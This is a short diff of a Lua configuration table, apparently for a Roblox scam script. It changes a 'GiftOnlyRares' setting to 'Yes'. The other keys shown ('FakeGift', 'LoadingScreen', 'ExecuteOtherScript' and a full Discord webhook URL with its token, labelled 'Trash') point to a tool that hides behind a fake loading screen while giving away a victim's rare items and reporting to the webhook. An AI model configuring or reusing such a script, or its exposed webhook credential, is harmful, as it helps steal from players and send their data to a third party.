@@ -6,7 +6,7 @@ _G.NullConfig = {
     FakeGift = "No",
     Trash = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
     LoadingScreen = "Yes",
-    GiftOnlyRares = "No",
+    GiftOnlyRares = "Yes",
     ExecuteOtherScript = "No",
 }
     
